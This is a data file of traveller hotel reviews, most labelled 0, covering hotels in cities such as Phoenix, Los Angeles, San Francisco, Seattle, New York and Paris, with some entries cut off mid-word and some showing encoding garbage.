"terribly disappointing...... just a few of the problems listed here - no towels, sewage leaking from the toilet (for over 9 days), charges for phone calls we did not make, charges for items in the fridge that we did not take. no beach towels, begging for bath towels, not enough chairs on the beach nor the pools, shuttle service from the club to the beach almost non existent - always breaking down. we walked more than we rode. two weeks of wearing a path from our building #8 at the club part of the resort to the reception with a list of problems that they were hard pressed to fix. staff was often rude. always a line-up of people with problems/issues.i will give the resort good marks for the beautiful beach and the food was quite good - especially the restaurants.this resort simply did not have the staff nor the inventory of items to accommo",0

"overall a great experience if you don't know shinjuku station very well, then i would suggest that on your arrival, you take a taxi to the hotel. the daily shuttle is a great service provided by the hotel, but it is tricky to find the location of the shuttle if you don't know where to look. the taxi ride costs only the basic fare of 640 yen. the location of this hotel is really great though and only a very short walk up the road to the neon lights of electric street where you can find many japanese style eateries amongst the hubbub of people out shopping for bargains. the hotel room was very good for the price and the english speaking staff were generally very helpful. each morning, the breakfast (included in our package) was tasy and provided both western style and japanese. my one complaint is that because we travelled with a child, we were forced to book a triple room, and despite booking and requesting a queen size bed some 5 months in advance, the hotel was unable to accomo",0

"come here and feel like a star i stayed at the hilton back in june because my friend and i wanted to go to universal studios after our visit to disneyland.right as i arrived at the hotel, i was put in vacation mode. the location is very nice. it's isolated at the top of a hill, away from noisy traffic. i got there through super shuttle and right as i got off, a greeter asked for my name and led me to the check-in counter. my friend and i are young and we weren't exactly dressed our best that day but we were still treated with respect. i was there 2 hours before check-in time but they gave me a room right away with no hassle. the elevators that take you up to your room were dark and slow. nothing major but just a slight inconvenience. if you have to meet someone at a set time, plan a few extra minutes for the elevator to arrive.the room we had was great. our view wasn't fantastic but it was nice enough since we didn't put in a special request. it overlooked the parking lot of universal studios. we also saw part of the theme park. the furnishings in the room were nice, clean, modern, and very inviting. the size was also amazing. we had a standard, non corner room but the size was still larger than the standard hotel room. my room only had two people but it could easily accomodate a family of 4-5. another nice touch is the huge windows. it let in a lot of light into the room and made it very welcoming. the bathroom is large and very clean, even cleaner than my bathroom at home. the countertop was marble and there were a lot of vanity lights. the shower stall was a good size and the showerhead is placed high up to accomodate taller guests. the toiletries that the hotel provides are crabtree and evelyn. you get a shower cap, mouth wash, shampoo, conditioner, body lotion, hand soap, bath bar soap, and an eyeglass polishing cloth. the beds are very comfortable. king size beds for doubles rooms with high quality sheets and a lot of pillows. i would even say it might have been pillow overload. my friend and i had to plop some down in the closet when we were ready to crawl into bed at night. the next morning, we felt great and very relaxed. for breakfast, we ordered room service. i ordered the all-american breakfast and my friend had granola with yogurt. for room service, the food was very reasonably priced. it's not cheap but it was a few dollars less than you would find at other hotels. when i placed my order, i was told to expect delivery in half an hour. the wait time was actually 10 minutes. the food wasn't gourmet but it was good. if you don't feel like ordering room service breakfast, i highly recommend saddle ranch in universal citywalk. that place has great food, amazing staff, and a nice ambiance. when we ate there, our orange juice was complimentary. when we went down to start off our day at universal studios, the greeter at the door actually remembered my name and said good morning to me. i have never had anyone remember my last name and actually greet me by name anywhere else. an example that shows the attention to detail that they train their staff to have. the hotel has a shuttle that takes you to the theme park but it's not necessary. the walk downhill is only 7-10 minutes to get to universal. (little tip for universal parkgoers: in order to avoid the long ticket lines, buy your tickets at the automated machine off to the left side of the ticket kiosks. it's in between saddle ranch and the universal fountain.)i didn't use the pool but i did go to take a look. it's small but i don't think a lot of guests use it. if i ever return to universal studios again, i would definitely revisit the hilton. i had a great experience there. when i was checking out, there was a short line of 3 guests waiting and the manager immediately got more staff to speed things up for the guests. pros: large rooms, friendly staff, clean, nice beds, nice bathroom, beautiful furniture, quiet, proximity+within walking distance of universal studios, mp3/ipod adapter plug on clock radiocons: honestly, nothing major that i can think of.",0

"couldn't have been more accomodating decided to attend my high school reunion being held at the sheraton, but liked the hilton better, so decided to stay there for that night. i needed a double-bed room, as i needed to bring my disabled mother (whom i care for) and we need to have our own beds.the hotel was very busy that saturday, and when we checked in, the desk clerk said they only had a room with a king bed...no way! i had reserved a double bed room!, i explained, as i pointed to my mother waiting at the side in her wheelchair.the desk clerk got my drift, and was very understanding. she began punching in buttons on her computer and making calls, and wha-lah, a recently vacated room popped up. yeah!the only complaint is that the air conditioning did not seem to work...could not adjust cooler or more fan circulation. the bellhop said he could try to get us a fan (accomodating and extremely nice man), but apparently, none was to be found.i ordered room service for mom and then talked with the desk. they said that if i left them my cell number, they would call me if mom needed me, and that they would alert security that there was a disabled person in our room (in case of emergency). so nice! after i left to attend the reunion, mom's dinner was delivered (that person was helpful with getting her to the table and helping with her food preparation), and they later did a physical check-in with her, with a complimentary fruit basket in hand, just to be sure she was o.k. that was above and beyond the call of duty!!! i was so gratefull for their attentiveness to our needs, and that because of that, i was allowed to have a carefree night out (which is seldom, when you are a full-time caregiver!). everyone, including the bellman who kept mom company while i retreived our car upon leaving, was exceptionally kind, friendly, professional and accomodating!thank you, hilton hotel!!!kb edwardsporter ranch, ca",0

"definitely will stay again! this was my 4th trip to san francisco, all staying at the tuscan inn. please note, i only come to s.f. once a year, yet when i walked in the door, the front desk person recognized me and greeted me by name before i could identify myself. wow! this hotel will give you the same room on every visit, but for this trip i requested a different room (heavy briefcase). no problem! room was just around the corner from the elevator. the room was clean, a little small, but very cozy and comfortable. since i was with a business group, we had advance reservations for the restaurant/bistro. found the food there to be quite nice, and our service was always prompt and efficient. in fact, 2 of us have food allergies, and they bent over backwards to accomodate, changing recipes for us as needed.my only complaint for this hotel... sometimes the concierge is hard to find. the concierge goes off-duty at 4 or 5 p.m... too bad my meetings never end til after 5. however, the front desk staff is always more than willing to jump in with helpful advice and recommendations. i've tried 4 or 5 of the local recommended restaurants, and the staff definitely knows what the area has to offer. location is fantastic -- 2-1/2 blocks from fisherman's wharf, 4 blocks to pier 39, 1-1/2 blocks to the trolley. price is nice. to summarize, i've always had a pleasant experience at the tuscan, and will definitely return again and again.",0

"best deal in nyc would i stay here again? in a new york minute, yes! the room was clean, the location excellent, the staff helpful (all shifts). we had the two bedroom penthouse suite (ph-a). it was a full moon and we spent a good amount of time outside on the roof eating lunch, reading and enjoying the upward view of the surrounding buildings. we also had room 7a for part of our family. the room was equally clean and even larger (it didn't have the outdoor space that the roof top penthouse offered). we also had family in 9a which was a one bedroom unit. again, much larger than one would expect. we really felt like our whole family got to experience life in nyc the way it is lived by residents. fresh fruit, milk, juice, coffee and bagels were brought up daily during our 4 day stay. there's a full grocery store w/in 2 blocks. there's a shop on the corner where we bought a dozen fresh long stem roses for $6. we were able to pick up cabs almost every time right outside the hotel. a couple of times we went up to lexington 49th just to pick up a cab quicker. we were roughly 4 blocks to the un, an easy walk. about the same to rockefeller center. about the same to grand central station and the chrysler building. my daughter spent 1 night in the w hotel which was next door and we were blown away by how much of a deal this little hotel offered compared to what she paid at the w. the little pizza shop downstairs was a good cheap pizza for one night. we cooked in for a few lunches and one dinner (the grocery has a number of items that are prepared meals w/ great flavor). all in all, the only hesitation i have in recommending the hotel is the fear that too many people will learn of it and make it harder to get reservations here.",0

"great deal we stayed at the omni for four nights during a recent vacation to los angeles. it was hard to get a good look at the outside of the hotel because we were never standing that far back. inside, i enjoyed the modern asian inspired flower arrangements. we found the hotel to be located centrally to the things we wanted to do. driving to the j. paul getty museum, a trip to the griffith observatory, walking to the fashion district and dining in beverly hills. the staff was courteous upon our arrival and we were efficiently checked into our room. i was a bit nervous because we had a voucher purchased through a discount travel company listed on tripadvisor. there were no problems and it turned out it was just a really good deal. the hotel is located across from the moca and within the california plaza. we wandered the plaza and found the nearby water features to be very nice, a great spot to sit in the morning with coffee. in general the area was nice although if walking there is an underpass i would suggest you skip walking under. i was surprised to see so many people walking in la. i didné¥?? encounter any maintenance issues and the room was always made up before we returned for the day. the options for the minibar were numerous and predictably expensive. the bed while made up with layers of padding and soft sheets was so warn i didné¥?? sleep well many nights. all the padding over the mattress seemed to trap the heat and even with the air conditioning on cold the bed was too hot. this seems to be a common effect of the padding hotels are adding to their bedding. the complimentary toiletries were nice and the towels thick and absorbent. the tile on the floor of the shower was a sad small pale pink tile but overall the bathroom was nice. the counter had enough space, the lighting was bright enough and they even had a make-up mirror. the one thing i missed was a light in the closet. it was difficult to see my clothes after hanging them away. we didné¥?? use the restaurant or the room service. we usually had coffee in the room before heading out for the day. we did use the complementary wireless internet and the valet parking. i have no complaints with either. we didné¥?? turn on the tv so i have no comment on that. the view was okay. we overlooked some modern art in the plaza below. the fitness room was very nice. it was equipped with elliptical trainers, treadmills and stationary bikes for aerobic training. the also had cybex machines and free weights for weight lifting. they had towels, water and headsets freely available in the room. a couple of the elliptical machines had tv monitors and there was a large plasma screen tv in the room. i noticed the lap pool outside the fitness room but didné¥?? give it a try. all in all we had an enjoyable stay and wouldné¥?? hesitate to visit the omni again.",0

"fantastic personalized service We booked Le Placide for our recent trip to Paris. My sister and I, and my parents had rooms on the same floor meaning we had one floor all to ourselves. The rooms are not huge but definitely comfortable and roomy enough by Parisian standards. They were clean, well appointed and pleasant. We go to Paris every year and we have stayed in hotels like the Plaza Athenee, Pvailion de la Reine and the boutique Hyatt at Malsherbes. Though all were equally good in varying degrees, Le Placide has won us over in terms of service. We felt like very welcome guests in someone's home. The location, of being in the Saint Germain area is also a definite plus.From the time we arrived ( we requested for a car to fetch us at the train station), every request we made was catered to quickly and warmly. Restaurant reservations were made on our behalf and everyone, from Madame Marie, Nicholas, Christophe and even the guy who poured coffee for breakfast was genuinely accomodating. One thing that stands out in my memory was when we requested for a taxi to wait for us at the CDG airport- we went to Spain after Paris, and we were flying in from Granada and going straight to catch the Eurostar to London, we didn't want to have to queue for a cab or take the train afraid of delays and all that. So we asked the hotel to book us a taxi for that ",0

"a peaceful room in buzzing city we stayed at this hotel in late april/ early may, in one of the ordinary rooms on the 1st floor. we got married in central park may 1st so part of the stay was our honeymoon. alltogether we stayed for 7 nights and could easily stayed longer.it was a small room with a queen sized bed, an open closet, a drawer, a small tv, a wash basin and a shower. the window faced the back garden. all the rooms (5 i think) on one floor shared two toilets which were perfectly cleaned all the time, and so was our room. the towels were changed every day if you threw them on the floor, and shampoo and soap were provided when needed. no hair dryer, but i bought one for 25 dollars at the drugstore on the corner (a traveling model that can be used on 110 and 220 v).the style of the interior design was old american country classic and very suitable for this classic brownstone buildning. the street was calm and quiet, and the neighborhood contained of people from all walks of life and had a lot of good breakfast lunch, coffee, dinner and bar choices. also, you have movie theatres, some shops and the riverside walk with all sorts of sporting activities. and several subway and bus lines close by. the staff was very quick and helpful with luggage, answering questions and leaving messages when someone phoned us. i can highly recommened this as a romantic get away, and if you are to get married in nyc, you have the chelsea flower shops just araound the corner.",0

"great hotel - beware pool drink prices it was a great hotel for young travellers (i stayed with two friends, all around 25 years old). good location, fun people. our room was cute, adequately sized and overlooked the walk of fame. we were a bit nervous driving to our hotel, as we passed some questionable neighborhoods and a friend had warned us that the hollywood area was ghetto. but we were pleasantly surprised to find the strip of hollywood occuped by the roosevelt very nice. the pool is nice, nothing extremely special but cute. but drink prices were a bit insane. we paid $75 for a small pitcher of vodka lemonad that was way too sweet to even drink. we each had one sip and left the rest. overall, a great experience. i would definitely go back, but avoid the drinks at the pool.",0

"above average stay stayed one night at the tuscan inn. hotel could not have been in a better location -- can't be beat!! check in was smooth. room ready and very comfortable. nicely appointed rooms. a few suggestions: the wooden blinds don't keep the rooms dark enough once the sun rises, street noise was a bit loud (i bought a set of ear plugs.) the remote to our tv wasn't working (a new one was set up promptly.) the bed was comfortable with a nice thick comforter. the courtyard was in full bloom with beautiful flowering plants. we didn't get a chance to sample the afternoon wine as we were gone most of the day. valets quick to get the car out of the garage and very helpful with directions. the hotel restaurant was a bit over priced but good service and good quality. i would stay there again and would highly recommend.",0

"great location at an affordable price i booked my rooms via booking.com about 2 months in advance. we checked on 29 september at noon and were told that the room would be ready in an hour. hence we left our luggages with the staff, who helped us store it in the basement whilst we headed out for lunch. when we returned an hour later, we got the keys to our rooms, as promised.the great thing about this hotel is its location. situated in the heart of union square, you are walking distance to the hustle and bustle that san francisco has to offer. we were a party of 4 who stayed 3 nights in 2 connecting that shared a toilet on the 7th floor (top floor). the room, though on the small side, had sufficient space to lay our large luggages on the floor, but it didn't leave us that much space . the decor was simple and colourful and the room adequately furnished with a writing table, a chest of drawers and a small closet. our wish was that the double bed could be bigger, as it was slightly smaller than queen size.before my stay, i was rather apprehensive about the hotel, having read the mixed reviews on tripadvisor, but eventually i didn't have a choice as all hotels in sf city seemed to have been booked up for the weekend. i'm glad i stuck to it, as we found it to be real value for money, considering the location.being in the heart of union square, it is understandable that it would be noisy throughout the day. we could hear the sound of sirens (police, ambulance, fire dept) throughout the night, especially on saturday. on monday, we were awoken by the noises from the road works downstairs. as i am a light sleeper, i overcame the noise with ear plugs.as for cleanliness, the rooms was clean and tidy. the only complaint we had were the towels. we found small stains on the white towels and requested to have them changed. unfortunately, the new towels that we got were also stained. eventually, we learnt to live with it, even though it made us slightly uncomfortable.overall, we were happy with our stay at herbert hotel and would recommend it to friends who were travelling on a tighter budget but still wished to be near the heart of the city.",0

"decent hilton property stayed here for 5 nights to attend conference @ biltmore. tripadvisor reviews were negative for biltmore so i opted for this property.overall, a positive experience, some issues. first, the good points about this property. plenty of free parking, good housekeeping staff, rooms were clean and the majority of the staff was friendly and helpful. nice pool areas especially for families w/ young kids.the first night i was given a first floor room (queen) in north pointe blgd. not close to main lobby and room was not in great condition. shower head was broken. i had asked for an upgrade as a faithful hh member but front desk said no rooms available which was contrary to bartender who told me 40% occupancy on sunday?the remainder of stay was on the 3rd floor of south pointe blgd, better room(king) overlooking pool area. room was ok for a military rate but i would not pay more than that rate.an issue w/ front desk about a fax that was sent twice, but we were told initially was not received, manager quickly addressed problem and advised staffer was new an unaware of the fax log.property has some maintenance issues, a set of elevators under repair for entire stay resulted in some waits. blgds have some obvious wear issues, but saw work being done to correct and staff completing punch lists.again it was a good experience for a reasonable rate.",0

"two nights of noise we spent two nights here while visiting hollywood and warner bros studios. at first glance the hotel looks o.k...my husband and i both thought it reminded us of the sort of place we stayed in as kids, during summer road trips with our families. (i.e. very 1970's kitsch) once inside, the rooms are just o.k. once you hop into bed after a long day of sight seeing...look out! it really sounds as if you are sleeping next to the daytona speedway. the beds are super shaky (i.e. if one person moves the entire bed sort of tilts) we thought we could mask the freeway noise by keeping the wall unit a/c on all night but it's set to a thermostat. it starts with a loud bang and stops with a thunk... all night long. it's better to just try and deal with the non-stop traffic noise. if you bring your own pillows from home, make sure that they don't have white pillow cases. our pillow cases and one of our pillows vanished the first time housekeeping came to change our linens and haven't been seen since. we were promised that they would be mailed to us when they are found.on a positive, the hotel restaurant was superb. the staff was very polite throughout our entire stay. that said, i don't think we'll be returning anytime soon. for an extra $30.00 a night we should have stayed at the sheraton.",0

"great value first let me say, i was traveling on a budget and alone! i found this hotel on hotels.com for approximately $100.00 per night. i checked other reviews here on tripadvisor and decided to go for it. i was pleasantly surprised. the staff was very accomodating in finding me a room that was in a main hallway so that i would feel comfortable in the fact that i was a female traveling alone. the breakfast that was included was not gourmet, but certainly a luxury that we americans do not see very often. the room was very clean. yes, it was small and the comforter wasn't down filled, but you should expect that if you are paying $100.00 a night.the decor' of the lobby and the sitting area was nice. there were three computers and a printer available with a swipe of a card. i found this particularly convenient the day i was leaving. i was able to check-in online for my flight and print my boarding pass. finally...i was right around the corner from union square and plenty of desireable restaurants. i would recommend this hotel to anyone that doesn't feel the need to spend $400.00 per night for a room.",0

"a little slice of hollywood stayed for three nights in march in a concierge room, view at the front of the hotel with hollywood in one direction and beverly hills greenery in the other.unspectacular and very crowded pool (with ducks in the smaller pool!) which was perfectly adequate for a couple of hours of sunshine but would not have kept me entertained for a week. however they were hosting a huge wedding on the first day, and then closed the pool for a film crew on the second day. this didnt matter to us as we were going to universal, and they did make arrangements for guests to use a nearby hotel. actually we quite liked coming downstairs on our first morning and finding a film set! concierge facilities were good, with complimentary breakfast, snacks, internet etc. rooms were lovely - very comfortable beds, nice furnishings, lcd tvs. location about 10 mins drive from rodeo drive, 20-25 mins from chinese theatre. note that the sushi restaurant, breeze, doesn't do sushi on a sunday, which caught us out. however, when we complained (as the regular menu was far from satisfactory - food was over seasoned and tepid) they refunded our meal. this was appreciated! also, the general manager was absolutely charming and very helpful.",0

The rooms were comfortable and the entire hotel pristine in cleanliness. The amenities left nothing to desire. The hotel is situated above a B of A, convenient to get money and Whole foods market.

"customer service was great after reading all 113 reviews, i was skeptical. sometimes i wonder if these reviews help or hinder a trip. my family of 4 (2 girls 5 and 10) travelled with my parents to phoenix for a 5 day vacation. my mother can be hard to please. she had a great time. here are the positives and negatives. every person we encountered at the hotel was friendly. the rooms we average. they are not the nicest hilton rooms, but the are great for a family. we stayed in the north building in a 1 bdrm suite. it was nice to shut the doors and watch tv while kids slept. there is only one sink, but there is a dressing area in the bedrooom. the price is actually good. we have relatives that paid the same at a basic best western and they didn't have near the pool areas that we had. we had a great pool right by our room and when we wanted a change we wandered off to the river ranch, something my children enjoyed thouroghly. the food at the hole-in-the-wall for breakfast was good. the dinner a bit pricey and only average. i suggest you rent a car and try some of the other restaurants that phoenix has to offer. if you don't have a cracker barrel restaurant where you are from search one out while here. they are the best. also aunt chiladas is just o.k. if you come from an area with good mexican food you will not enjoy this restaurants version. try to eat at macayos. much better. all in all this is a good hotel for the price with better customer service then we have encountered in many of the high end resorts we have stayed at. i wondered where some of these other people stayed when i got there and compared reviews. i do agree that the hilton should install safes in each room as my father (a retired police officer) caught a 13yr old trying to steal walletts at the river ranch.",0

"All style, no substance I'll preface this review by stating that I'm quite grouchy due to the fact that I haven't been able to sleep for the past four nights, so take these comments for what they're worth, but I am so horribly disappointed by this hotel that I have decided to write my first TripAdvisor review as a rebuttal to all the glowing reviews that led me to book here in the first place.As most people do, I'll start with the positive, what little there is.This hotel oozes with style. From the lobby to the rooftop pool, everything is visually quite stunning. It's sophisticated and modern in an urban way that seems just right in such a stylish city. The room I'm in has a beautiful wood floor, a lovely minimalist bathroom with sliding glass doors and slate tile floor, and the furnishings are very cleverly laid out so as to maximize space.The location is very convenient, walking distance from just about everything and the Jaume I metro station is about a block away for what lies outside of walking distance. There's an organic supermarket down the street (and room in the minibar fridge to put things) as well as cafes and banks and pharmacies - anything you'd need. I'll admit that I picked this hotel mainly for its location and I was not at all disappointed in that regard.The staff, too, at least the ones I've encountered so far, have been nothing but friendly, helpful and gracious. Nothing all that exceptional, but definitely everything you would hope for. I don't fault them one bit.HOWEVERUnderneath this sleek exterior is a whole wealth of aggravatingly poor design and planning. The bed, for example. It looks beautiful the way they make it up and very inviting after an arduous cross-Atlantic flight. It's quite bouncy, good for jumping, I'd imagine, and I'm seriously not at all picky about beds - I'll happily dream away on the hardest of futon mattresses - but I can actually feel the springs poking up through the skimpy cushioning and I can't fall asleep for more than a few hours without one of my limbs falling asleep. This morning I noticed a bruise on my hipbone from lying on one side for too long. My neck and shoulders ache something fierce and I now understand why they put little note cards everywhere advertising in-room massages. After sleeping on their beds, you'll need one.My second major complaint: the lighting in the rooms. There is not enough of it. And what little there is is so infuriatingly poorly positioned it makes me want to scream. In the lobby, the poor lighting feels moody and seems almost appropriate. But there is no excuse for what they've managed to do in the rooms. There are three recessed overhead lights, one directly above (maybe slightly behind) the head of the bed, one directly above the sink and one above and slightly in front of the toilet. There is also a desk lamp on the desk, some sort of lighting inside the closet and a coil of Christmas lights behind the headboard that serves only to add atmosphere. That sounds like enough, doesn't it? Well, the desk lamp is perfectly functional, I won't complain about it. And the atmospheric closet and bed lights do what they set out to do well enough. But the light above the bed is pointed in such a way so as to blind you should you want to read in bed lying on your back and if you should try to turn over and lie on your stomach, it takes some real effort to position yourself and the book in such a way that the pages are illuminated. And it also somehow fails to sufficiently light the side of the room it is responsible for. The light over the sink also points straight down, casting shadows on the face, making it impossible to see in the mirror. I caught a reflection of myself in the mirror of a well-lit bathroom yesterday and I absolutely looked like a clown, having applied too much blush and crooked eyeliner. And my boyfriend keeps cutting himself shaving. The third overhead light, over the toilet is totally mysterious to me. It allows you to see the floor in front of you perfectly, and somehow fails to pour any of its light into the shower, making it the darkest single corner in the room. I simply don't understand it.Speaking of the bathroom, it certainly looks very pretty and modern and spotlessly clean. But if anyone anywhere in the hotel flushes their toilet while you happen to be in the shower, the water turns scalding hot for a good 10 seconds. The showerhead is on one of those poles where you can slide it up and down to your desired height, which seems quite nice until you realize that there is no way to make the showerhead stay where you have put it and have to do a kind of dance in order to remain in the stream of water. And the shower has no door or curtain, only a panel of glass 2 or 3 feet wide that does nothing to prevent the entire bathroom from getting wet.The walls are very thin and poorly soundproofed and, even though I thought I had booked an Executive Room on a high floor with views over the city, I was instead lucky enough to be assigned a (cheaper, smaller) room overlooking a playground where children can be heard screaming until well past midnight.I have a few other smaller complaints, like the food we ordered from room service late last night being pretty bad, though admittedly very prompt and convenient at 4 in the morning when we couldn't sleep, the air conditioner is rigged so that it turns off when you leave the room, meaning you always come back to a room that is hot and stuffy, and the rooftop pool, albeit totally picturesque, doesn't have nearly enough seating to accommo",0

Beautiful Resort but not paradise for us The Majestic Colonial Resort is a beautiful resort which has a lot to offer vacationers. The grounds are breathtaking and constantly being cared for and the enormous pool is truly majestic and never feels crowded. The beach was lovely and you never had to worry about finding a lounger or shade area if that is where you wanted to relax. The ocean temperature was actually warmer than the pool water and the beach was well taken care of and cleaned daily by staff. The staff there were friendly and always courteous and always attempted to provide for your needs to the best of their ability. Our favorite restaurant was the gourmet restaurant and their service and four entrees offered were excellent. The only consistent complaint I would have about the restaurants is that coffee is not readily available. The servers would usually pour a half cup and many times it was prepoured and frequently not hot when it was served. (I wondered if the availability of coffee beans were affected by previous storms as I never noticed this at my stay in Puerto Plata several years ago.) Unfortunately the weather during our stay was not ideal with lots of cloudy days and frequent heavy rains that makes your entire vacation experience less than ideal. The hotel has no control over the weather but the little annoyances that you may not have noticed become more pronounced when you are spending more time wandering around the resort in the rain. Be prepared to wear rubber soled sneakers as the beautiful tiled hallways and walkways are extremely slippery when wet especially during downpours.I don't want to sound like a complainer but would like to comment on some issues I encountered so that other guests may be able to avoid them in the future and enjoy their stay more. Room It was a standard jr. suite in building 4 which was a ground floor room with our balcony facing the construction area that was blocked by a black netting. The construction work did start early and several night went late probably trying to make up for lost hours due to heavy rainfalls. (Noise was an issue if you chose to use the patio but not heard inside room) The room is very large and we had no issues with the layout of this suite. The bed was fine but the pillows could be improved. The sofa is not comfortable(if you were sitting in the sun this would not be an issue) and the fabric covering it and the bench appeared dirty due to old stains. The increased moisture and ground floor location also contributed to increased number of centipede/inchworm type creatures found inside our room throughout our stay. (The rooms were cleaned excellent by staff so cleanliness was not the contributing factor here.) We were unfortunately assigned a room that had a door that would accomo,0

"excellent hotel we stayed at the jurys hotel for 3 nights in december and thoroughly enjoyed the break. the hotel was clean and well maintained and all staff were courteous and friendly. a call to our room by the front-desk staff 5 minutes after our arrival to check everything was ok was a nice thought. the location is excellent - close to shops, restaurants and tourist attractions.the room was well laid out and a reasonable size. we didn't experience any noise-related problems. complimentary water was provided in the fridge, and mini-bar snacks could be requested - in fact you can pre-arrange for your favourites to be present in your room upon arrival.cuffs is a pleasant, typical hotel bar with decent service and surroundings. the breakfast buffet in the restaurant is worth the extra money and offers a good selection.wireless internet access is available throughout the hotel for free, and the business facilities including printing are also free (handy for printing out airline boarding passes!)whilst the front-desk staff could not accommo",0

"i love you lti! well yet again, lti lived up to my expectations!this review is a bit lengthy, but wanted to share as much as possible!this was our 6th trip to punta cana, and our 3rd to lti. we traveled there in may of 2007 and again in september of 2007.lets start at the beginningé¥?br/flight:we flew on usa 3000 with a nonstop flight from baltimore. i would highly recommend this airline to anyone who has the availability to use them. check-in at the airport was a breeze, as was the flight. they have food and alcohol for purchase and an inflight movie.airportonce we arrived in puj, we paid our $10 and received our bags, then headed to our prearranged transfer with mikesmarina. there are a lot of porters after baggage but a firm é¥?¸?o graciasé¥?goé¥??? a long way. the transfer service through mikesmarina is highly recommended to those whoé¥??? transfer was not included in your package. it cost us $66 round trip. the driver was waiting on us, and we went right to a nice air-conditioned van and headed down the road. the drive was about 20-25 minutes with no stops.checkin/room:we arrived at lti around 12:15pm and got checked in. before leaving ié¥?? requested a room in building 5, although no big deal, we werené¥?? given building 5. we received a room in building 3 which is right in the middle of the property with no views of anything. we asked to be moved, and juan at the front desk, said to check in the morning. the room in building 3 was nice, the air worked great, however there was just nothing pleasing to look at.the next morning we went to breakfast and returned and found a note stating to come to reception. the manager greeted us, and said because of being return guests he had a special room for us, and moved us oceanfront.the bellman moved us to our new room, which was awesome! we had an actual king sized bed, not like in the past where it was two beds pushed together, with a secondary bedroom with 2 twin beds and a sitting area. you could lie in bed and look directly into the clear blue waters of the ocean.it was perfect!!food:the food is good, however a bit repetitive, but was always able to find something to eat. we ate at the buffet every morning for breakfast and once for lunch. in seven days, we at the buffet dinner 2 times, which was a pleasant surprise. the food was great!the other nights we rotated between the estrella del mar (ala carte) and la trattoria (ala carte/italian). you make reservations outside the main buffet each morning, and never had a problem getting it. even went one night without reservations and was accommo",0

"good location for universal oct 2004 - my husband and i were in la for a wedding and the sheraton universal was recommended by the groom. i looked here and saw that the reviews of the sheraton were not so great so i chose the hilton based on its reviews. i was happy i did. it is not cheap nor is it a spectacular hotel for the price. we usually stay at much fancier hotels. the room was very clean and a good size with a small table and chairs and a seperate desk where my husband set up his laptop to connect to the internet. there was a fruit basket in the room with fresh fruit, water and cookies upon our arrival.it was a quick 5 minute walk to city walk and universal. hotel self-parking was very convenient. the valet staff was great as the held my car by the entrance if i was running back out. concierge helped with some practical issues and front desk staff was pleasant, but we did not have any special requests from them. the hotel is convenient to the highway - right in front actually. the brunch on sunday was very good with lots of variety. pool area was quiet and pleasant. overall, i don't think you could go wrong here.",0

"friendly staff we stayed here at the beginning and end of a trip to arizona so we were here during two differernt weekends. the staff was extremely helpful and friendly. i would say they are the best part of the hotel! an elevator was broken during our last stay and it was most annoying, but did not greatly impact the overall experience. we found the place quiet, the complimentary breakfast a notch above some others at similar chain hotels, and the parking adequate. all in all it is a nice and affordable spot for sightseeing in the area.",0

"great change of pace for spring break just returned from 7 nts at squaw peak resort march 19-26th. two families went with 5 kids ages 2, 5, 6, 7 and felt the resort was better than expected for families. we stayed at the south pointe suites and found them fairly comfortable for a family of 5. splurge for a casita if rates are decent and money is not an issue. the coyote club for kids is 5-stars. their staff is first class all the way. our kids begged us to go again and again - it was well worth the money. we only wish it was included in the price of our stay. we all enjoyed the hole-in-the wall restaurant at night with the fire pit, the creamery, aunt chiladas, the pools. and mini-golf course. the main pool was a bit crowded, then again, it was spring break. spent a few mornings at the sister resort, tapatito cliffs which was a nice change of pace. staff was warm and friendly at both. took a guided hike, enjoyed the spa, and many other attractions az has to offer such as the botanical gardens, rawhide, spring training baseball games, and more. we all had a great time and highly recommend this resort. yes, there are nicer resorts in the area, but this one is perfect for families with small children and affordably priced.",0
"beautiful hotel--a little spooky/noisey, but a good value the hotel has a rich history--the academy awards used to be held there. it was jfk's campaign headquarters in 1960. the beatles once landed on the rooftop there in a helicopter. although beautiful, remember it is an old building. i recently stayed there and experienced random unexplained noises in my room (haunted perhaps?) that kept my awake. bring earplugs. if that doesn't work, some holy water and an exorcism should do the trick.",0

"perfect location!! while it's true that it is not the perfect place, believe me when i say that it is actually a diamond in the rough. my boyfriend and i came to visit seattle for the first time this year, we stayed for 4 days/3nights and since i knew we were going to be out of the hotel the majority of our days with sightseeing i decided to book a room here. best decision i ever made!!my pros:- everything is within walking distance (space needle is practically in your backyard, belltown with all the restaurants, bars, and clubs is just a few blocks down the street and the pike place market is about a 10 minute walk away or you can hop on a bus to go deeper downtown, etc)- rooms are clean.- heater worked really well- they have room service, and their staff of servers are pretty considerate and nice- free wireless internet service and it's fast!- room service called us to ask if we needed new towels or anything else.- my boyfriend bought fish at pike's market, which was delivered to this hotel. they were nice enough to store it in their restaurant freezer for us free of charge!some cons:- you have to pay for parking- the hallways kind of scared me upon getting off the elevator because it seemed pretty dingy (they need to do some steam cleaning or something - i would not want to walk around on bare feet!)- the construction zone next to the hotel might worry people but seriously, we didn't hear any of that noise through the walls or anything in the morning.- the people at the front desk can be a little nicer but that really wasn't a big deal to us.overall, we enjoyed our stay at this hotel because of its location. you can pretty much see almost everything there is to see in seattle (or at least the best places if not everything) if you stay here and you wouldn't even need a car!",0

"florence was lovely, but !!! the hotel it self was lovely. the rooms were great and it was a short distance to see david and a little longer to see the duomo. you can walk all around the city from there. our only problem was that when we arrived we were told that there was not a room available and that they were putting us up in another hotel for the evening. the other hotel was not in the same category as this hotel. this of course ruined out first day as we had to check in one hotel and then on the next day check into the athenaeum. we could not get an early start. we booked our hotel and travel plans from gate 1 who could not believe what happened. i will see what happens with them now that i'm home. there are so many places to see in florence that 3 days was not enough. if your reservations go according to schedule, you should have a clean, comfortable room and a great time. they were very helpful after that and tried to accommo",0

"nice hotel but..... very nice hotel, well remodelled and tasteful accommodations. staff was helpful, polite and unobtrusive. the major problem is the number and outright in your face quality of the derelicts that inhabit every street corner, bench, and doorway of the pioneer square area. to be forced to watch so that you dont step in someones urine trail, to have to turn your back so as to not have to watch a derelict urinate in broad daylight on the biulding on a main street, to have to push one of them away from me when he kept circling back closer and closer to me, is too much.i will never stay in downtown seattle again. well over a hundred dollars and you are a prisoner in your hotel. the derelicts have taken over pioneer square. they own their benches, doorways, and covered areas. they own pioneer square.wake up seattle and take your city back.guess i will be staying at the airport nextime. lots of good restaurants and shops that are loosing customers due to the prevalence of these derelicts.",0

We were there a week, so we had more than enough time to sample all that this wonderful hotel had to offer. First of all, the lobby is lovely and spacious and we were greeted with a smile every time we went in or out of the building (which was quite often). Check-in was super quick and very friendly. We had a rental car (which I would highly recommend if you plan to stay here as a tourist) and parking was very easy. The front desk staff were happy to vali",0

